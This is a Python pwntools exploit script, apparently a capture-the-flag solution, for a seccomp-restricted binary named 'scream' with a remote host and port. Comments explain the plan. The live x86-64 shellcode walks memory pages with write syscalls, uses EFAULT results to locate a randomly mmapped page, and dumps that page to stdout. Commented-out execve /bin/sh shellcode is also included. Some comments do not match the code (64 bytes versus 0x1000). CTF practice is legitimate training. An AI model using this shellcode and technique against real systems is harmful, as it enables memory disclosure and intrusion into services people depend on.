#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("scream")
arguments = ['FLAG{YOU_WIN_GOOD_JOB!!!!}']
# b *main+641
# b main
gs = '''
b *main+641
'''
def start():
    if args.GDB:
        return gdb.debug([elf.path] + arguments, gdbscript=gs)
    if args.REMOTE:
        return remote("54.85.45.101", 8002)
    else:
        return process([elf.path] + arguments)

# Plan:

# We first tried to pop a shell using syscall execve but this was not allowed because
# of seccomp calls
# But we can do as many write syscalls if we set desired syscall to be 1.
# We have found out that the program uses mmap to request memory from the kernel.
# MMAP will allocate memory that belongs to the process and is within its addr space
# but it does not become part of the heap like when using malloc.

# The mmapped region is of size 1 page = 0x1000 = 4096 bytes. So 1 page on a 64 bit system
# They do a modulo with Haystack: char* randomaddr = random_num %  0x4200000 + HaystackSize: 0x100000000
# in order to get a random address where they will make the mmap start from.
# Haystack is the lowest possible address and the HaystackSize is 4gb of memory.
# This means that the mmapped region will be between 0x4200000 + 4gb, but we don't know where.

# What can we do?
# We can use the write syscall to iterate through every page of memory starting from 0x4200000.
# Every time we get to the beginning of a new page we will print the first byte. If the first byte
# gives the error EFAULT: Buf is outside your accessible address space.
# This error has code 14. Can be found with: errno -l | grep EFAULT 
# Therefore if the write fails we know that rax will contain the number 14 and we can go to the
# next memory page (+ 0x1000).

# If the write does not give an error we will write the entire the first 64 byte of the page
# This is a hint from the ctf task because it says: write(1, AAAAAAAAAAAH, 64)


"""
# 0x68732f6e69622f
# Cannot execute execve bevause of securecomp even though we specify syscall 59 as desired
shellcode = asm('\n'.join([
    'mov rdi, 0',
    'mov rsi, 0',
    'mov rax, 59',
    'mov rcx, 0x0068732f6e69622f', 
    'mov [rsp+8], rcx',
    'lea rcx, [rsp+8]', 
    'mov [rsp+16], rcx',
    'mov rdi, [rsp+16]',
    'mov rdx, 0',
    'syscall',
]))
"""
# Working on this.
shellcode1 = asm('\n'.join([
    'mov rsi, 0x4200000',   # buff addr to write from
    'increase:',
    'mov rax, 1',           # syscall nr. 1: write
    'mov rdi, 1',           # output to stdout
    'add rsi, 0x1000',      # increment 1 page
    'mov [rbp-0x8], rsi',
    'mov rdx, 0x1',         # write 1 byte
    'syscall',              # write
    'cmp rax, 0xfffffffffffffff2',        # -0xE = 14 EFAULT errno
    'je increase',          # if EFAULT, jump to increase
    'mov rdx, 0x1000',        # else write 0x40=64 byte from page
    'mov rax, 1',           # syscall nr. 1: write
    'mov rdi, 1',           # output to stdout
    'mov rsi, [rbp-0x8]',
    'syscall',


]))
"""
shellcode2 = asm('\n'.join([
    'mov rax, 1',
    'mov rdi, 1',
    'mov rsi, 0x0',
    'mov rdx, 0xffffffffffffffff',
    'syscall',
]))
"""
# Addresses

# Functions

io = start()

recv = io.recv()
print(recv)

#io.recvline()
io.sendline(b"1")
#io.recvuntil(b"execute!", timeout=2)
recv = io.recv()
print(recv)
io.sendline(shellcode1)

io.interactive()
